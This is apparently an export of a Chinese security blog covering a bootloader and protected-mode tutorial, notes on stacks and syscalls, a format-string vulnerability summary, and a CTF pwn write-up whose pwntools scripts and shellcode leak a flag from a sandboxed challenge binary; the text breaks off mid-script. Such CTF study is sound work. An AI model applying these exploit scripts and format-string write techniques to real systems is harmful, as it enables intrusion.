<p>if是输入文件，of是输出文件，bs指定大小，count指定块数目，seek指定跳过多少块，conv=notrunc是以不打断文件的方式转换文件(conv convert)</p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>最后运行vm，即可成功运行mbr和loader中的程序，最后的结果:</p>
<p>没有loader<br><img src="https://cdn.jsdelivr.net/gh/0xME3/Images@main/img/2023-02-22_23-04.png" alt="MBR"></p>
<p>有loader<br><img src="https://cdn.jsdelivr.net/gh/0xME3/Images@main/img/2023-02-22_23-05.png" alt="loader"></p>
<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><ul>
<li>sreg(segment register)不能使用立即数赋值</li>
<li><code>$</code>和<code>$$</code>是nasm编译器预留的关键字，用来表示当前代码和当前section的地址</li>
<li><code>int 0x10</code>是x86汇编中调用BIOS汇编的方式</li>
<li><code>equ</code>关键字用于nasm中定义宏，<code>宏名 equ 值</code></li>
</ul>
<h1 id="进入保护模式"><a href="#进入保护模式" class="headerlink" title="进入保护模式"></a>进入保护模式</h1><h2 id="定义GDT"><a href="#定义GDT" class="headerlink" title="定义GDT"></a>定义GDT</h2><p>进入保护模式，首先要定义GDT，即全局描述符号表(global descriptor table)，其起始地址我们选为0x7E00，但是目前是物理地址，我们需要将其转换为逻辑地址和偏移地址，也就是除以16位。</p>
<p>一个描述符的长度为8字节(四字)，其内容如下图:</p>
<p><img src="https://cdn.jsdelivr.net/gh/0xME3/Images@main/img/seg_des.png" alt="seg_des"></p>
<p>GDT中的内容有：</p>
<ul>
<li>CPU规定GDT的第一个描述符必须为空</li>
<li>代码段描述符</li>
<li>数据/栈段描述符</li>
<li>显存段描述符</li>
</ul>
<p>然后使用<code>lgdt</code>指令将其加载进gdtr，该指令的参数需要3个字，第一个字是gdt的大小，第二个双字是gdt的地址。</p>
<p>接着还需要打开A20线，这是处理器的第21根地址线。古早年间地址线有20根，但实模式下的寄存器是16位，因此不需要考虑地址到达16位时+1是进位还是舍弃(也就是0x100000等价于0x0)。但由于CPU的进步，为了兼容曾经的程序中，需要当寻址0x0fffff+1时不会变成寻址0x100000。所以需要控制寄存器到达0x0fffff时，+1是进位还是舍弃。</p>
<p>控制的方式就是通过A20M#(A20 Mask)引脚，来决定是否屏蔽A20地址线，低电平有效。所以进入保护模式前，要先设置其为高电平。0x92地址的值就是用来控制该引脚的值的，我们将其设置为1。</p>
<p>最后就能进入保护模式了，切换模式的开关是CR0寄存器，他的第一位就是PE(Protection Enable)位，设置其为1即可。</p>
<p>最后在保护模式下执行代码，因为保护模式中，BIOS中断不能用了，所以必须重新设置保护模式下的中断环境，在设置之前呢，则需要关闭中断功能，也就是使用<code>cli</code>指令，清除中断位。</p>
<p>接着通过段选择子来执行最后的打印代码。</p>
<p>完整代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; boot/include/boot.inc</span><br><span class="line">;load from START sector &amp; store in BASE address</span><br><span class="line">;---------------------------</span><br><span class="line">LOADER_BASE_ADDR equ 0x900</span><br><span class="line">LOADER_START_SECTOR equ 0x2</span><br><span class="line"></span><br><span class="line">;get Descriptor</span><br><span class="line">;---------------------------</span><br><span class="line">;%1: Segment base</span><br><span class="line">;%2: Segment limit</span><br><span class="line">;%3: Segment attribute</span><br><span class="line">;---------------------------</span><br><span class="line">%macro Descriptor 3</span><br><span class="line">  dw %2 &amp; 0xffff                            ;segment_limit</span><br><span class="line">  dw %1 &amp; 0xffff                            ;segment_base</span><br><span class="line">  db (%1 &gt;&gt; 16) &amp; 0xff                      ;segment_base</span><br><span class="line">  dw ((%2 &gt;&gt; 8) &amp; 0xf00) | (%3 &amp; 0xf0ff)    ;attribute+segment_limit+attribute</span><br><span class="line">  db (%1 &gt;&gt; 24) &amp; 0xff                      ;segment_base</span><br><span class="line">%endmacro</span><br><span class="line">……</span><br><span class="line"></span><br><span class="line">;descriptor attribute</span><br><span class="line">;---------------------------</span><br><span class="line">DA_32 equ 0x4000               ;32 bit</span><br><span class="line">DA_C equ 0x98                  ;__x</span><br><span class="line">DA_DRW equ 0x92                ;rw_</span><br><span class="line">DA_DRWA equ 0x93               ;rw_(alive)</span><br><span class="line"></span><br><span class="line">;selector attribute</span><br><span class="line">;---------------------------</span><br><span class="line">RPL0 equ 0</span><br><span class="line">RPL1 equ 1</span><br><span class="line">RPL2 equ 2</span><br><span class="line">RPL3 equ 3</span><br><span class="line">TI_GDT equ 000b</span><br><span class="line">TI_LDT equ 100b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; boot/loader.S</span><br><span class="line">%include &quot;boot.inc&quot;</span><br><span class="line">section loader vstart=LOADER_BASE_ADDR</span><br><span class="line"></span><br><span class="line">[bits 16]</span><br><span class="line">loader_start:</span><br><span class="line">  ;get total_memory</span><br><span class="line">  ;---------------------------</span><br><span class="line">get_mem:</span><br><span class="line">  mov ah,0x88</span><br><span class="line">  int 0x15</span><br><span class="line">  jc failed</span><br><span class="line">  and eax,0xffff</span><br><span class="line"></span><br><span class="line">  mov cx,0x400</span><br><span class="line">  mul cx</span><br><span class="line">  shl edx,16</span><br><span class="line">  or edx,eax</span><br><span class="line">  add edx,0x100000</span><br><span class="line"></span><br><span class="line">mem_get_ok:</span><br><span class="line">  mov [total_memory_byte],edx</span><br><span class="line">failed:</span><br><span class="line">  jmp near $</span><br><span class="line"></span><br><span class="line">  ;load gdt</span><br><span class="line">  ;---------------------------</span><br><span class="line">  lgdt [gdt_ptr]</span><br><span class="line"></span><br><span class="line">  ;protect mode</span><br><span class="line">  ;---------------------------</span><br><span class="line">  ;use A20</span><br><span class="line">  ;---------------------------</span><br><span class="line">  in al,0x92</span><br><span class="line">  or al,0000_0010B</span><br><span class="line">  out 0x92,al</span><br><span class="line"></span><br><span class="line">  ;close interruption</span><br><span class="line">  ;---------------------------</span><br><span class="line">  cli</span><br><span class="line"></span><br><span class="line">  ;set cr0</span><br><span class="line">  ;---------------------------</span><br><span class="line">  mov eax,cr0</span><br><span class="line">  or eax,0x1</span><br><span class="line">  mov cr0,eax</span><br><span class="line"></span><br><span class="line">  ;run code with protect mode</span><br><span class="line">  ;---------------------------</span><br><span class="line">  jmp dword CODE_SELECTOR:(p_mode_start-0xa00)</span><br><span class="line"></span><br><span class="line">;gdt content</span><br><span class="line">;-----------------------------</span><br><span class="line">gdt_addr:</span><br><span class="line">  ;the first global descriptor is null</span><br><span class="line">  ;---------------------------</span><br><span class="line">  GDT_BASE:</span><br><span class="line">    dd 0x0</span><br><span class="line">    dd 0x0</span><br><span class="line">  ;code descriptor</span><br><span class="line">  ;---------------------------</span><br><span class="line">  CODE_DESC:</span><br><span class="line">    Descriptor 0xa00,SegCode32Len-1,DA_C+DA_32</span><br><span class="line">  ;data descriptor</span><br><span class="line">  ;---------------------------</span><br><span class="line">  DATA_DESC:</span><br><span class="line">  STACK_DESC:</span><br><span class="line">  ;video descriptor</span><br><span class="line">  ;---------------------------</span><br><span class="line">  VIDEO_DESC:</span><br><span class="line">    Descriptor 0xb8000,0xffff,DA_DRW</span><br><span class="line"></span><br><span class="line">  GDT_SIZE equ $-GDT_BASE</span><br><span class="line">  GDT_LIMIT equ GDT_SIZE-1</span><br><span class="line">  CODE_SELECTOR equ (0x0001&lt;&lt;3)+TI_GDT+RPL0</span><br><span class="line">  DATA_SELECTOR equ (0x0002&lt;&lt;3)+TI_GDT+RPL0</span><br><span class="line">  STACK_SELECTOR equ (0x0003&lt;&lt;3)+TI_GDT+RPL0</span><br><span class="line">  VIDEO_SELECTOR equ (0x0002&lt;&lt;3)+TI_GDT+RPL0</span><br><span class="line"></span><br><span class="line">gdt_ptr:</span><br><span class="line">  dw GDT_LIMIT</span><br><span class="line">  dd GDT_BASE</span><br><span class="line"></span><br><span class="line">total_memory_byte dw 0</span><br><span class="line">ards_buf times 256-($-$$) db 0</span><br><span class="line">ards_nr dw 0</span><br><span class="line"></span><br><span class="line">SegCode32:</span><br><span class="line">[bits 32]</span><br><span class="line">p_mode_start:</span><br><span class="line">  mov eax,VIDEO_SELECTOR</span><br><span class="line">  mov gs,eax</span><br><span class="line"></span><br><span class="line">  mov byte [gs:0xA0],&#x27;2&#x27;</span><br><span class="line">  mov byte [gs:0xA1],0x4</span><br><span class="line">  mov byte [gs:0xA4],&#x27;L&#x27;</span><br><span class="line">  mov byte [gs:0xA5],0x4</span><br><span class="line">  mov byte [gs:0xA6],&#x27;O&#x27;</span><br><span class="line">  mov byte [gs:0xA7],0x4</span><br><span class="line">  mov byte [gs:0xA8],&#x27;A&#x27;</span><br><span class="line">  mov byte [gs:0xA9],0x4</span><br><span class="line">  mov byte [gs:0xAA],&#x27;D&#x27;</span><br><span class="line">  mov byte [gs:0xAB],0x4</span><br><span class="line">  mov byte [gs:0xAC],&#x27;E&#x27;</span><br><span class="line">  mov byte [gs:0xAD],0x4</span><br><span class="line">  mov byte [gs:0xAE],&#x27;R&#x27;</span><br><span class="line">  mov byte [gs:0xAF],0x4</span><br><span class="line"></span><br><span class="line">  jmp near $</span><br><span class="line"></span><br><span class="line">SegCode32Len equ $-SegCode32</span><br></pre></td></tr></table></figure>

<h2 id="note-1"><a href="#note-1" class="headerlink" title="note"></a>note</h2><ul>
<li><code>in/out</code>指令用来访问外设对应的内存式寄存器</li>
<li><code>[bits 16/32]</code>来决定编译后机器码的位数，也就是说决定之后代码在哪个模式下运行</li>
<li>在指令前使用反转码，能够临时使用另一个模式执行，(操作数反转码为0x66，寻址反转码为0x67)</li>
<li>在保护模式中进行跳转时(<code>jmp</code>)，需要加上<code>dword</code>关键字，这样才能使用gdt中描述符的前32位作为地址填充CS。</li>
</ul>
]]></content>
      <tags>
        <tag>操作系统</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞小结</title>
    <url>/2022/03/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p>记录自己对格式化字符串漏洞的理解。</p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>格式化字符串漏洞是利用程序员对格式化字符串函数的错误使用导致的对栈上的内容造成了泄露或内存中地址内容的改写。</p>
<p>在利用格式化字符串漏洞前，我们需要对格式化字符串函数有个大概了解，<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/#_2">CTF Wiki</a>上写的很详细。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>格式化字符串漏洞的利用需要有程序执行格式化字符串函数的环节。</p>
<h3 id="基本利用"><a href="#基本利用" class="headerlink" title="基本利用"></a>基本利用</h3><h4 id="泄露栈上内容"><a href="#泄露栈上内容" class="headerlink" title="泄露栈上内容"></a>泄露栈上内容</h4><p>通过<code>%&#123;&#125;$p</code>来泄露栈上地址。</p>
<h4 id="改写地址内容"><a href="#改写地址内容" class="headerlink" title="改写地址内容"></a>改写地址内容</h4><p>通过<code>%&#123;&#125;$n</code>和向栈上写入任意地址来实现改写任意地址内容。并且’n’为覆盖4字节内容，’hn’为覆盖2字节内容，’hhn’为覆盖1字节内容。</p>
<p>需要注意的是，不同模式下的传参方式不同导致构造的payload中的格式化字符串的参数不同。32位模式下，参数都是在栈上保存的，没什么好说的；64位模式下，前6位参数保存在寄存器内，因此泄露或改写的地址一般从第7位开始计算。</p>
<p>使用<code>Pwngdb</code>的<code>fmtarg</code>指令获得泄露该地址的格式化字符串，或手动计算偏移得到格式化字符串。</p>
<p>利用这两个基本操作外，我们根据栈溢出漏洞攻击的思路进行攻击，也有格式化字符串漏洞攻击的技巧。</p>
<h3 id="利用漏洞技巧"><a href="#利用漏洞技巧" class="headerlink" title="利用漏洞技巧"></a>利用漏洞技巧</h3><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>能利用格式化字符串漏洞泄露栈上内容，因此可以得到出现在栈上的libc函数的地址再计算offset泄露libc的基地址；当开启了随机化保护时，也可以找到栈上main函数的<code>rbp</code>。</p>
<h4 id="对地址块中间的内容进行修改"><a href="#对地址块中间的内容进行修改" class="headerlink" title="对地址块中间的内容进行修改"></a>对地址块中间的内容进行修改</h4><p>由于缓冲区大小的限制，导致我们不能覆盖内容为一个很大的数。因此，我们经常使用<code>hn</code>或<code>hhn</code>来进行改写内容，但由于64位模式下，一个地址块的大小为8字节，所以我们直接以该地址为任意写的地址，我们只能改到最多低2字节。但是我们如果给该地址加上一点偏移作为任意写的地址，就能对地址块中间的内容进行修改。举一个直观的例子：</p>
<p>假设栈上地址<code>0x00</code>的内存块的内容为<code>0xAABBCCDDEEFFGGHH</code></p>
<p>如果我们欲修改<code>0x00</code>地址的中间的<code>0xEE</code>内容的这一个字节。直接以<code>0x00</code>为地址，修改的就是最后的<code>0xHH</code>。所以我们要使用<code>0x03</code>为任意写地址，那么就能修改到中间的<code>0xEE</code>了。</p>
<h4 id="栈上的partial-overwrite"><a href="#栈上的partial-overwrite" class="headerlink" title="栈上的partial overwrite"></a>栈上的partial overwrite</h4><p>栈上的partial overwrite除了利用栈溢出漏洞进行改写，也可以使用格式化字符串漏洞进行低位地址的修改，但是由于需要修改低12位地址，因此还需要泄露待改写函数的倒数第二字节的内容或者爆破。</p>
<h4 id="利用栈上的链式结构进行任意地址改写"><a href="#利用栈上的链式结构进行任意地址改写" class="headerlink" title="利用栈上的链式结构进行任意地址改写"></a>利用栈上的链式结构进行任意地址改写</h4><p>常用于非栈上的格式化字符串漏洞，即我们写入的格式化字符串并不是在栈上，所以我们不能通过写入任意地址进行改写。</p>
<p>常利用<code>rbp</code>的链式结构(栈帧中的内容总是上一个栈帧或0)对任意地址进行改写。以当前栈帧(rbp中的地址)中存储的上一个栈帧的地址作为任意写的地址并对其中内容进行改写为我们需要修改的内容，再对上一个栈帧中的存储的地址作为任意写的地址并对其中内容进行改写。画一个更直观的图：</p>
<p><img src="https://s2.loli.net/2022/03/04/kXphy9uBxaMcjPg.png" alt="6"></p>
<p>当然如果能直接构造地址放在桟上也是可以的。</p>
<h4 id="printf-loop"><a href="#printf-loop" class="headerlink" title="printf_loop"></a>printf_loop</h4><p>修改printf的返回地址或其中某处的返回地址，指向程序中的read处，反复进行地址修改。适用于格式化字符串漏洞后之间exit的情况。</p>
<p><em>暂时就这些，其他的等我想起了或者遇到新的技巧再补充。</em></p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>栈介绍</title>
    <url>/2022/03/04/%E6%A0%88%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>对于此数据结构，我们不过多讲述，仅以执行程序时内存中的运行时栈来简单讲讲。</p>
<span id="more"></span>

<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>栈是一种只允许在一端插入或删除的线性表，且允许插入和删除的一端称为栈顶，另一端称为栈底。</p>
<h3 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h3><p>在执行程序时，系统会为这个程序分配一块虚拟地址空间，这块空间中的一部分为该程序对应的<strong>运行时栈</strong>。当一个<code>x86-64</code>过程需要的存储空间超过了寄存器能够存放的大小时，或需要保存局部变量时，就会在栈上分配空间。这个部分称为<strong>过程</strong>的<strong>栈帧</strong>(Stack Frame)。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。具体见下图</p>
<p><img src="https://s2.loli.net/2022/03/05/HAdJVeYC9BiNcT2.png" alt="32位模式下内存经典布局"></p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>后进先出(LIFO)：由于栈只允许在一端插入或删除，因此具有此特性，并称为LIFO(Last In First Out)。</p>
<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="Push"><a href="#Push" class="headerlink" title="Push"></a>Push</h3><p>即入栈，插入新的元素作为栈顶。</p>
<h3 id="Pop"><a href="#Pop" class="headerlink" title="Pop"></a>Pop</h3><p>即出栈，取出栈顶元素。</p>
<p>在程序运行时栈中也是以入栈与出栈为基本操作。</p>
<h2 id="栈上的局部储存"><a href="#栈上的局部储存" class="headerlink" title="栈上的局部储存"></a>栈上的局部储存</h2><p>到目前为止，大部分过程都不会出现超过寄存器大小的本地存储区域了，不过有时，局部数据还是要存放在内存中，包括：寄存器不足而存放、一个变量的地址要存放、某些局部变量是数组或结构体只能存放在内存中。</p>
<p>而过程中产生的局部变量存储在栈帧中，过程的参数存储在该栈帧前。并且通过入栈顺序和数据大小能轻易计算出与栈帧的偏移，并通过<code>lea</code>指令与<code>rbp</code>寄存器中保存的栈帧地址来得到变量的地址，从而使用。<a href="https://messap.github.io/2022/03/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/">函数调用约定</a></p>
<h2 id="函数调用栈的过程"><a href="#函数调用栈的过程" class="headerlink" title="函数调用栈的过程"></a>函数调用栈的过程</h2><p>简单介绍一下过程。</p>
<p>前面提到在程序运行中，栈会有属于自己的一块空间，并且会分配<strong>过程的栈帧</strong>。实际上，软件中将封装代码的方式称为过程，过程用一组指定参数和一个可选的返回值实现了某种功能。因此我们能想到：函数、方法、处理函数等都是<strong>过程的形式</strong>。</p>
<p>而函数调用栈的过程，实际上对应了计算机提供给过程执行的支持：<strong>传递控制、传递数据、分配和释放内存</strong>。</p>
<p>具体过程为:</p>
<ol>
<li>先是<strong>传递数据</strong>，将此函数所使用到的参数依次入栈，然后得到数据与栈帧指针的偏移来利用数据。</li>
<li>再是<strong>转移控制</strong><ol>
<li>执行了<code>call</code>指令，进行两步操作：<ol>
<li>将当前<code>ip</code>或<code>cs和ip</code>压入栈中，即<code>push ip</code></li>
<li>转移，与<code>jmp</code>原理相同</li>
</ol>
</li>
</ol>
</li>
<li>接着执行函数<strong>分配内存</strong>：<ol>
<li>将<code>bp</code>压入栈，即<code>push bp</code></li>
<li>减小栈指针，即<code>sub sp,idata</code>，分配了足够大的栈帧空间</li>
</ol>
</li>
<li>函数终止，开始<strong>释放内存</strong>：<ol>
<li>执行<code>leave</code>指令，进行两步操作：<ol>
<li>释放栈空间，即<code>mov sp,bp</code></li>
<li>恢复栈帧，即<code>pop bp</code></li>
</ol>
</li>
<li>最后<strong>恢复控制</strong>，执行<code>ret</code>指令：<ul>
<li>修改<code>ip</code>内容为栈顶中的内容，即<code>pop ip</code></li>
</ul>
</li>
</ol>
</li>
</ol>
<p>至此算是一个函数调用的过程，且无论是在32位平台还是64位平台都是如此，由此可以看出<strong>过程能够递归的调用它们自身</strong>，并且每个过程都有属于自己的栈帧。</p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>系统调用介绍</title>
    <url>/2022/03/04/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>稍微介绍了一下Linux不同模式的系统调用。</p>
<span id="more"></span>

<h2 id="Linux下的系统调用"><a href="#Linux下的系统调用" class="headerlink" title="Linux下的系统调用"></a>Linux下的系统调用</h2><p>系统调用和普通库函数调用非常相似，只是系统调用由操作系统内核提供，运行于内核态，而普通的库函数调用由函数库或用户自己提供，运行于用户态。</p>
<p>系统不同模式下的系统调用的方式不同:</p>
<p>32位模式下，系统调用通过<code>int 0x80</code>执行中断类型码为128(0x80)的中断处理程序。<code>int</code>指令是汇编中的中断操作，而128对应的中断处理程序为：中断将指定程序传送给正在处理该中断的人，通过检查寄存器<code>eax</code>中的值，通知内核程序想要进行的系统调用，这个值称之为系统调用号。</p>
<p>64位模式下，系统调用通过<code>syscall</code>执行。<code>syscall</code>是由内核提供的用户空间与内核空间进行交互的一套标准API，这些API能够让用户受限的访问硬件设备。其运作原理与<code>int 0x80</code>类似，也是通过检测<code>rax</code>中的值来执行指定系统调用。</p>
<p>由于本人水平有限，不宜在此处多讲，免得误人子弟。但如果仅是为了做CTF中的题目，那么我们只需要知道不同模式下系统调用的方式即可。</p>
<h3 id="32"><a href="#32" class="headerlink" title="32"></a>32</h3><p>传参方式：系统调用的参数存储在<code>ebx</code>,<code>ecx</code>,<code>edx</code>中，返回值存在eax寄存器</p>
<p>系统调用号：将系统调用号存入eax</p>
<p>调用方式：使用<code>int 0x80</code>中断调用使系统进入内核态，执行系统调用</p>
<p>具体包括系统调用号可以看这篇<a href="https://blog.csdn.net/xiaominthere/article/details/17287965">文章</a>。</p>
<h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><p>传参方式：参数依次存入<code>rdi</code>，<code>rsi</code>，<code>rdx</code>寄存器中，返回值存在rax寄存器</p>
<p>系统调用号：系统调用号传入<code>rax</code></p>
<p>调用方式：使用<code>syscall</code>进行系统调用</p>
<p>若将系统调用号看作参数，实际上可以将64位的系统调用看作<code>syscall([rax],[rdi],[rsi],[rdx])</code></p>
<p>系统调用号可以看这篇<a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">文章</a>。</p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝帽杯2022初赛_pwn_wp</title>
    <url>/2022/07/13/%E8%93%9D%E5%B8%BD%E6%9D%AF2022-pwn-wp/</url>
    <content><![CDATA[<!-- 还是太菜 -->

<span id="more"></span>

<h2 id="EscapeShellcode"><a href="#EscapeShellcode" class="headerlink" title="EscapeShellcode"></a>EscapeShellcode</h2><p>对于汇编代码的运用还是没有融会贯通，以至于编写 shellcode 时并没有第一时间想出。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>只有 canary 没开启</p>
<p>执行 shellcode，由于沙盒保护，只能使用 write 将 flag 输出，因此我们需要泄露 BINARY_BASE，可以通过 heap 上的 main_arena 泄露 libc 版本，拿到 environ 中的地址，在通过栈上的地址拿到 BINARY_BASE。</p>
<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">lea rsi,[rip]</span></span><br><span class="line"><span class="string">add rsi,0x1c28</span></span><br><span class="line"><span class="string">mov rsi,[rsi]</span></span><br><span class="line"><span class="string">sub rsi,0x3c4b78</span></span><br><span class="line"><span class="string">add rsi,0x3c6f38</span></span><br><span class="line"><span class="string">mov rsi,[rsi]</span></span><br><span class="line"><span class="string">sub rsi,0xd0</span></span><br><span class="line"><span class="string">mov rsi,[rsi]</span></span><br><span class="line"><span class="string">sub rsi,0x1531</span></span><br><span class="line"><span class="string">add rsi,0x4120</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sl(asm(shellcode))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>但是由于题目没给出 libc 版本，所以这个只能在本地打打了。</p>
<p>根据其他师傅的 wp，这道题是可以直接通过堆地址爆破出的</p>
<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">lea rsi,[rip]</span></span><br><span class="line"><span class="string">sub rsi,0x400000</span></span><br><span class="line"><span class="string">and rsi,0xfffffffff0000000</span></span><br><span class="line"><span class="string">mov edx,0x50</span></span><br><span class="line"><span class="string">A1:</span></span><br><span class="line"><span class="string">add rsi,0x1000</span></span><br><span class="line"><span class="string">mov eax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">test eax,eax</span></span><br><span class="line"><span class="string">jng A1</span></span><br><span class="line"><span class="string">add rsi,0x4120</span></span><br><span class="line"><span class="string">mov rdx,0x300</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov eax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sl(asm(shellcode))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h2><p>唉，第一个关于 money 的漏洞就没看见，太菜了。</p>
<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ul>
<li><p>由于 have_money==0 时，就不会对 have_money 进行减少，那么可以利用这个漏洞与 deposit 功能，无限增加 have_money</p>
</li>
<li><p>接着使用 transfer_admin 功能，泄露 heap</p>
</li>
<li><p>利用 transfer_guest 构造一个 tcache 大小范围外的 chunk，再使用 transfer_admin 功能泄露 libc 版本</p>
</li>
<li><p>将 tcache 0x20 大小填满后，使用 fastbin_dup 来 getshell</p>
</li>
</ul>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./Bank&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./Bank&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span 